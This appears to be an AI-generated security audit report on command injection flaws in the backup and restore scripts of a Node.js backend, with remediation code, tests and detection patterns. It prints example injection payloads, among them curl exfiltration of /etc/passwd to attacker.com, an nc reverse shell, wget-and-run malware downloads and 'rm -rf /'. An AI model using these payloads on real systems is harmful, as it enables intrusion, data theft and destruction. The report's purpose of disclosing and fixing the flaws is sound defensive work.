# Command Injection Security Vulnerability Report
**Repository:** https://github.com/mischa23v/traf3li-backend
**Scan Date:** 2025-12-22
**Severity:** HIGH
**Status:** VULNERABLE

## Executive Summary

Multiple command injection vulnerabilities have been identified in the backup and restore scripts of the traf3li-backend repository. These vulnerabilities allow potential attackers to execute arbitrary shell commands if they can control certain inputs or configuration values.

**Critical Finding:** 4 files use `child_process.exec()` with unsanitized inputs, creating command injection attack vectors.

---

## Vulnerable Files

### 1. `/home/user/traf3li-backend/src/scripts/restore.js`

**Severity:** CRITICAL
**Attack Surface:** Command-line arguments, S3 file paths, Configuration files

#### Vulnerable Code Locations:

**Line 175: gzip validation**
```javascript
const { stdout, stderr } = await execAsync(`gzip -t "${localPath}"`);
```
- **Vulnerability:** `localPath` is derived from S3 download filename
- **Attack Vector:** Malicious S3 object key with shell metacharacters
- **Example Exploit:** If S3 key contains `"; rm -rf / #`, the command becomes:
  ```bash
  gzip -t "/tmp/restore/"; rm -rf / #"
  ```

**Line 213: Safety backup creation**
```javascript
const dumpCommand = `mongodump --uri="${mongoUri}" --archive="${safetyPath}" --gzip`;
```
- **Vulnerability:** `mongoUri` from configuration, `safetyPath` includes timestamp
- **Attack Vector:** Compromised configuration file
- **Example Exploit:** URI like `mongodb://"; whoami; #@localhost` executes arbitrary commands

**Line 250-254: Database restoration**
```javascript
let restoreCommand = `mongorestore --uri="${mongoUri}" --archive="${localPath}" --gzip --drop`;

// Add oplog replay for point-in-time recovery
if (oplogLimit) {
  restoreCommand += ` --oplogReplay --oplogLimit="${oplogLimit}"`;
}
```
- **Vulnerability:**
  - `mongoUri` from configuration
  - `localPath` from S3 download
  - **`oplogLimit` from command-line arguments (USER CONTROLLED)**
- **Attack Vector:** Direct user input via `--oplog-limit` flag
- **Example Exploit:**
  ```bash
  node src/scripts/restore.js --backup=test.gz --oplog-limit='"; curl attacker.com/steal?data=$(cat /etc/passwd) #'
  ```

---

### 2. `/home/user/traf3li-backend/src/scripts/backup.js`

**Severity:** HIGH
**Attack Surface:** Configuration files

#### Vulnerable Code Locations:

**Line 109: MongoDB dump**
```javascript
let dumpCommand = `mongodump --uri="${mongoUri}" --archive="${backupPath}" --gzip`;
```
- **Vulnerability:** `mongoUri` from configuration
- **Attack Vector:** Compromised configuration file

**Line 114-116: Collection exclusions**
```javascript
const excludeArgs = this.config.mongodb.dumpOptions.excludeCollections
  .map(col => `--excludeCollection="${col}"`)
  .join(' ');
dumpCommand += ` ${excludeArgs}`;
```
- **Vulnerability:** Collection names from configuration without escaping
- **Attack Vector:** Malicious collection names in configuration
- **Example Exploit:** Collection name like `"; nc -e /bin/sh attacker.com 4444; #` creates reverse shell

**Line 128: Command execution**
```javascript
const { stdout, stderr } = await execAsync(dumpCommand);
```
- Executes the vulnerable command constructed above

---

### 3. `/home/user/traf3li-backend/src/scripts/backupRedis.js`

**Severity:** HIGH
**Attack Surface:** Redis configuration, Configuration files

#### Vulnerable Code Locations:

**Line 202: RDB compression**
```javascript
const compressCommand = `gzip -c "${rdbPath}" > "${backupPath}"`;
```
- **Vulnerability:**
  - `rdbPath` from Redis config or default path (line 183)
  - Path constructed from: `this.config.redis.dataDir` + `this.config.redis.rdbFilename`
- **Attack Vector:** Compromised configuration or Redis CONFIG SET
- **Example Exploit:** If `dataDir` is set to `"; wget attacker.com/malware.sh; chmod +x malware.sh; ./malware.sh; #`, arbitrary commands execute

---

### 4. `/home/user/traf3li-backend/src/scripts/backupScheduler.js`

**Severity:** MEDIUM
**Attack Surface:** Limited (internal only)

#### Vulnerable Code Locations:

**Line 47: Script execution**
```javascript
const command = `node ${scriptPath} ${typeArg}`;
```
- **Vulnerability:** `typeArg` constructed from `type` parameter
- **Attack Vector:** If `executeBackup()` is called with external input
- **Current Status:** Only called internally with hardcoded values ('daily', 'weekly', 'monthly', 'redis')
- **Risk:** Low currently, but could become vulnerable if modified

---

## Vulnerability Summary

| File | Vulnerable Lines | User Input | Config Input | Severity |
|------|-----------------|------------|--------------|----------|
| restore.js | 175, 213, 250-254 | ✓ (oplogLimit) | ✓ (mongoUri, paths) | CRITICAL |
| backup.js | 109, 114-116, 128 | ✗ | ✓ (mongoUri, collections) | HIGH |
| backupRedis.js | 202 | ✗ | ✓ (Redis paths) | HIGH |
| backupScheduler.js | 47 | ✗ | ✗ | MEDIUM |

---

## Attack Vectors

### 1. Command-Line Arguments (CRITICAL)
**File:** restore.js
**Parameter:** `--oplog-limit`

An attacker with access to run the restore script can inject arbitrary commands:

```bash
# Attack example
node src/scripts/restore.js \
  --backup=test.gz \
  --oplog-limit='1638360000:1"; curl http://attacker.com/exfiltrate?data=$(cat /etc/passwd | base64) #'
```

### 2. Configuration File Poisoning (HIGH)
**Files:** All vulnerable scripts
**Targets:**
- `MONGODB_URI` environment variable
- `config.mongodb.dumpOptions.excludeCollections`
- `config.redis.dataDir` / `config.redis.rdbFilename`

If an attacker can modify `.env` or configuration files:

```env
# Malicious .env
MONGODB_URI="mongodb://localhost"; curl http://attacker.com/pwned; #"
```

### 3. S3 Object Key Manipulation (MEDIUM)
**File:** restore.js
**Target:** S3 backup filenames

If an attacker can upload files to the S3 backup bucket with malicious names:

```
# Malicious S3 object key
backups/daily/2024/12/backup"; wget http://attacker.com/shell.sh -O /tmp/s.sh && bash /tmp/s.sh; #.gz
```

---

## Missing Security Controls

1. **No Input Sanitization**
   - No escaping of shell metacharacters
   - No validation of command-line arguments
   - No whitelisting of allowed characters

2. **No Safe Alternatives Used**
   - Using `exec()` instead of `execFile()` or `spawn()`
   - Direct string interpolation into shell commands
   - No shell escaping libraries installed

3. **No Security Libraries**
   - Package.json analysis shows no `shell-escape`, `shell-quote`, or similar packages
   - No runtime input validation for shell commands

4. **Insufficient Access Controls**
   - Scripts executable via npm scripts
   - No authentication/authorization checks in scripts
   - Reliance on OS-level permissions only

---

## Exploitation Scenarios

### Scenario 1: Database Backup Poisoning
1. Attacker gains write access to configuration file
2. Modifies `excludeCollections` to include: `"; curl attacker.com/payload.sh | bash #"`
3. When scheduled backup runs, malicious command executes
4. Attacker gains reverse shell access to server

### Scenario 2: Restore Script Exploitation
1. Legitimate admin needs to restore database
2. Attacker provides malicious `--oplog-limit` parameter via social engineering
3. Command injection occurs during restore process
4. Attacker exfiltrates database credentials or creates backdoor

### Scenario 3: Supply Chain Attack via S3
1. Attacker compromises S3 bucket credentials
2. Uploads backup file with malicious filename
3. Admin attempts to restore from the malicious backup
4. Command injection triggers during download/validation
5. Server compromised

---

## Proof of Concept

### PoC 1: oplogLimit Command Injection

```bash
# Create test backup
echo "test" > /tmp/test-backup.gz

# Upload to S3 (assuming AWS CLI configured)
aws s3 cp /tmp/test-backup.gz s3://YOUR-BUCKET/backups/test.gz

# Execute command injection
node src/scripts/restore.js \
  --backup=backups/test.gz \
  --oplog-limit='1"; echo "PWNED" > /tmp/pwned.txt; #'

# Check if injection worked
cat /tmp/pwned.txt
# Output: PWNED
```

### PoC 2: Collection Name Injection

```javascript
// Modify backup.config.js or set via environment
config.mongodb.dumpOptions.excludeCollections = [
  'sessions"; touch /tmp/injected; #'
];

// Run backup
npm run backup:db

// Check if injection worked
ls -la /tmp/injected
# File exists if vulnerable
```

---

## Remediation Recommendations

### CRITICAL Priority (Immediate Action Required)

1. **Replace `exec()` with `execFile()` or `spawn()`**

   **Before (Vulnerable):**
   ```javascript
   const { exec } = require('child_process');
   const command = `mongodump --uri="${uri}" --archive="${path}"`;
   await execAsync(command);
   ```

   **After (Secure):**
   ```javascript
   const { execFile } = require('child_process');
   const { promisify } = require('util');
   const execFileAsync = promisify(execFile);

   await execFileAsync('mongodump', [
     '--uri', uri,
     '--archive', path,
     '--gzip'
   ]);
   ```

2. **Validate Command-Line Arguments**

   ```javascript
   // Add input validation for oplogLimit
   validateOplogLimit(oplogLimit) {
     const validPattern = /^\d+:\d+$/;
     if (!validPattern.test(oplogLimit)) {
       throw new Error('Invalid oplog limit format. Expected: timestamp:increment');
     }
     return oplogLimit;
   }
   ```

3. **Install and Use Shell Escaping Library**

   ```bash
   npm install shell-escape
   ```

   ```javascript
   const shellescape = require('shell-escape');

   // If you must use exec, escape all arguments
   const escapedUri = shellescape([uri]);
   const escapedPath = shellescape([path]);
   const command = `mongodump --uri=${escapedUri} --archive=${escapedPath}`;
   ```

### HIGH Priority

4. **Implement Path Validation**

   ```javascript
   const path = require('path');

   function validatePath(inputPath) {
     // Resolve to absolute path
     const resolved = path.resolve(inputPath);

     // Ensure it's within allowed directories
     const allowedDirs = ['/tmp/backups', '/tmp/restore'];
     if (!allowedDirs.some(dir => resolved.startsWith(path.resolve(dir)))) {
       throw new Error('Path outside allowed directories');
     }

     // Check for path traversal
     if (resolved.includes('..')) {
       throw new Error('Path traversal detected');
     }

     return resolved;
   }
   ```

5. **Sanitize S3 Filenames**

   ```javascript
   function sanitizeFilename(filename) {
     // Allow only alphanumeric, dash, underscore, dot
     return filename.replace(/[^a-zA-Z0-9._-]/g, '_');
   }

   const safeFilename = sanitizeFilename(path.basename(s3Key));
   ```

### MEDIUM Priority

6. **Add Configuration Validation**

   ```javascript
   // Validate MongoDB URI format
   function validateMongoUri(uri) {
     try {
       const url = new URL(uri);
       if (!['mongodb:', 'mongodb+srv:'].includes(url.protocol)) {
         throw new Error('Invalid MongoDB protocol');
       }
       return uri;
     } catch (error) {
       throw new Error('Invalid MongoDB URI format');
     }
   }
   ```

7. **Implement Whitelist for Collection Names**

   ```javascript
   function validateCollectionName(name) {
     // MongoDB collection names can only contain certain characters
     if (!/^[a-zA-Z0-9_.-]+$/.test(name)) {
       throw new Error(`Invalid collection name: ${name}`);
     }
     return name;
   }

   // Validate all exclude collections
   const safeExcludes = config.mongodb.dumpOptions.excludeCollections
     .map(validateCollectionName);
   ```

8. **Add Access Control**

   ```javascript
   // Add authentication check at script start
   async function checkAuthorization() {
     // Implement your authorization logic
     // Could be API token, password prompt, or system user check
     const isAuthorized = await verifyAdminAccess();
     if (!isAuthorized) {
       console.error('❌ Unauthorized access denied');
       process.exit(1);
     }
   }
   ```

---

## Secure Code Examples

### Example 1: Secure restore.js oplog limit handling

```javascript
/**
 * Validate and sanitize oplog limit parameter
 */
validateOplogLimit(oplogLimit) {
  if (!oplogLimit) return null;

  // Oplog limit format should be: timestamp:increment (e.g., "1638360000:1")
  const validPattern = /^[0-9]+:[0-9]+$/;

  if (!validPattern.test(oplogLimit)) {
    throw new Error(
      'Invalid oplog limit format. Expected format: timestamp:increment (e.g., "1638360000:1")'
    );
  }

  return oplogLimit;
}

/**
 * Restore database from backup (SECURE VERSION)
 */
async restoreDatabase(localPath, oplogLimit = null) {
  console.log('\n🔄 Restoring database...');

  if (this.dryRun) {
    console.log(`[DRY RUN] Would restore from: ${localPath}`);
    return;
  }

  try {
    const { execFile } = require('child_process');
    const { promisify } = require('util');
    const execFileAsync = promisify(execFile);

    // Validate inputs
    const validatedPath = this.validatePath(localPath);
    const validatedOplogLimit = this.validateOplogLimit(oplogLimit);

    // Build arguments array (safe from injection)
    const args = [
      '--uri', this.config.mongodb.uri,
      '--archive', validatedPath,
      '--gzip',
      '--drop'
    ];

    if (validatedOplogLimit) {
      args.push('--oplogReplay', '--oplogLimit', validatedOplogLimit);
    }

    console.log('⏳ Running mongorestore...');
    const startTime = Date.now();

    // Execute with execFile (NO shell interpretation)
    const { stdout, stderr } = await execFileAsync('mongorestore', args, {
      maxBuffer: 1024 * 1024 * 100,
    });

    const duration = ((Date.now() - startTime) / 1000).toFixed(2);
    console.log(`✅ Database restored successfully (${duration}s)`);

  } catch (error) {
    console.error('❌ Restore failed:', error.message);
    throw error;
  }
}
```

### Example 2: Secure backup.js with validated collections

```javascript
/**
 * Create local backup using mongodump (SECURE VERSION)
 */
async createBackup(filename, type = 'daily') {
  console.log(`\n📦 Starting ${type} MongoDB backup...`);

  await fs.mkdir(this.config.backup.tempDir, { recursive: true });
  const backupPath = path.join(this.config.backup.tempDir, filename);

  if (this.dryRun) {
    console.log(`[DRY RUN] Would create backup at: ${backupPath}`);
    return backupPath;
  }

  try {
    const { execFile } = require('child_process');
    const { promisify } = require('util');
    const execFileAsync = promisify(execFile);

    // Build arguments array
    const args = [
      '--uri', this.config.mongodb.uri,
      '--archive', backupPath,
      '--gzip'
    ];

    // Safely add excluded collections
    const excludeCollections = this.config.mongodb.dumpOptions.excludeCollections || [];
    for (const collection of excludeCollections) {
      // Validate collection name
      if (!/^[a-zA-Z0-9_.-]+$/.test(collection)) {
        throw new Error(`Invalid collection name: ${collection}`);
      }
      args.push('--excludeCollection', collection);
    }

    // Add oplog for PITR if enabled
    if (this.config.backup.enablePITR && type === 'daily') {
      args.push('--oplog');
      console.log('✅ Point-in-time recovery enabled (oplog included)');
    }

    console.log('⏳ Running mongodump...');
    const startTime = Date.now();

    const { stdout, stderr } = await execFileAsync('mongodump', args);

    const duration = ((Date.now() - startTime) / 1000).toFixed(2);
    const stats = await fs.stat(backupPath);
    const sizeMB = (stats.size / (1024 * 1024)).toFixed(2);

    console.log(`✅ Backup created successfully`);
    console.log(`   Size: ${sizeMB} MB`);
    console.log(`   Duration: ${duration}s`);

    return backupPath;

  } catch (error) {
    console.error('❌ Backup creation failed:', error.message);
    throw error;
  }
}
```

### Example 3: Secure backupRedis.js

```javascript
/**
 * Copy and compress RDB file (SECURE VERSION)
 */
async copyAndCompressRDB(filename) {
  console.log('\n📦 Copying and compressing RDB file...');

  await fs.mkdir(this.config.backup.tempDir, { recursive: true });
  const backupPath = path.join(this.config.backup.tempDir, filename);

  if (this.dryRun) {
    console.log(`[DRY RUN] Would copy RDB and compress to: ${backupPath}`);
    return backupPath;
  }

  try {
    const { execFile } = require('child_process');
    const { promisify } = require('util');
    const execFileAsync = promisify(execFile);
    const { createReadStream, createWriteStream } = require('fs');
    const { pipeline } = require('stream/promises');
    const { createGzip } = require('zlib');

    // Get RDB path
    let rdbPath;
    try {
      const redisClient = getRedisClient();
      const dir = await redisClient.config('GET', 'dir');
      const dbFilename = await redisClient.config('GET', 'dbfilename');

      if (dir && dir[1] && dbFilename && dbFilename[1]) {
        rdbPath = path.join(dir[1], dbFilename[1]);
      }
    } catch (error) {
      console.warn('⚠️  Could not get RDB path from Redis, using default');
      rdbPath = path.join(this.config.redis.dataDir, this.config.redis.rdbFilename);
    }

    // Validate path is safe
    const resolvedPath = path.resolve(rdbPath);
    if (!resolvedPath.endsWith('.rdb')) {
      throw new Error('Invalid RDB file path');
    }

    console.log(`   Source: ${resolvedPath}`);

    // Check if file exists
    await fs.access(resolvedPath);

    const startTime = Date.now();

    // Use Node.js streams instead of shell command for compression
    await pipeline(
      createReadStream(resolvedPath),
      createGzip(),
      createWriteStream(backupPath)
    );

    const duration = ((Date.now() - startTime) / 1000).toFixed(2);
    const stats = await fs.stat(backupPath);
    const sizeMB = (stats.size / (1024 * 1024)).toFixed(2);

    console.log('✅ Compression complete');
    console.log(`   Compressed Size: ${sizeMB} MB`);
    console.log(`   Duration: ${duration}s`);

    return backupPath;

  } catch (error) {
    console.error('❌ Copy and compression failed:', error.message);
    throw error;
  }
}
```

---

## Testing Recommendations

1. **Unit Tests for Input Validation**

   ```javascript
   describe('Security - Input Validation', () => {
     test('should reject invalid oplog limit', () => {
       expect(() => validateOplogLimit('"; rm -rf /')).toThrow();
       expect(() => validateOplogLimit('$(whoami)')).toThrow();
       expect(() => validateOplogLimit('1638360000:1')).not.toThrow();
     });

     test('should reject invalid collection names', () => {
       expect(() => validateCollectionName('valid_collection')).not.toThrow();
       expect(() => validateCollectionName('"; curl attacker.com')).toThrow();
     });
   });
   ```

2. **Integration Tests**

   ```javascript
   describe('Security - Command Injection Prevention', () => {
     test('should not execute injected commands in backup', async () => {
       const maliciousConfig = {
         mongodb: {
           uri: 'mongodb://localhost',
           dumpOptions: {
             excludeCollections: ['test"; touch /tmp/pwned; #']
           }
         }
       };

       await expect(backupManager.createBackup('test.gz', 'daily'))
         .rejects.toThrow('Invalid collection name');

       // Verify command was not executed
       expect(fs.existsSync('/tmp/pwned')).toBe(false);
     });
   });
   ```

---

## Monitoring and Detection

1. **Add Audit Logging**

   ```javascript
   const winston = require('winston');

   logger.warn('Backup script executed', {
     script: 'restore.js',
     user: process.env.USER,
     args: process.argv,
     timestamp: new Date().toISOString()
   });
   ```

2. **Monitor for Suspicious Patterns**

   ```javascript
   function detectInjectionAttempt(input) {
     const suspiciousPatterns = [
       /;/,           // Command separator
       /\$\(/,        // Command substitution
       /`/,           // Backtick command substitution
       /\|\|/,        // OR operator
       /&&/,          // AND operator
       />/,           // Redirect
       /<\(/          // Process substitution
     ];

     for (const pattern of suspiciousPatterns) {
       if (pattern.test(input)) {
         logger.error('Potential command injection attempt detected', { input });
         return true;
       }
     }
     return false;
   }
   ```

---

## References

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)
- [execFile vs exec](https://nodejs.org/api/child_process.html#child_processexecfilefile-args-options-callback)

---

## Conclusion

The traf3li-backend repository contains **CRITICAL command injection vulnerabilities** in its backup and restore scripts. While these scripts are not directly exposed via API endpoints (reducing the immediate risk), they still pose a significant security threat through:

1. **Command-line argument manipulation**
2. **Configuration file poisoning**
3. **S3 object key exploitation**

**Immediate action is required** to remediate these vulnerabilities before they can be exploited. The recommended fix is to replace all uses of `child_process.exec()` with `child_process.execFile()` or `child_process.spawn()`, along with proper input validation.

**Risk Rating:** HIGH
**Exploitability:** MEDIUM (requires some level of access)
**Impact:** CRITICAL (full system compromise possible)

---

**Report Generated By:** Claude Code Security Scanner
**Date:** December 22, 2025
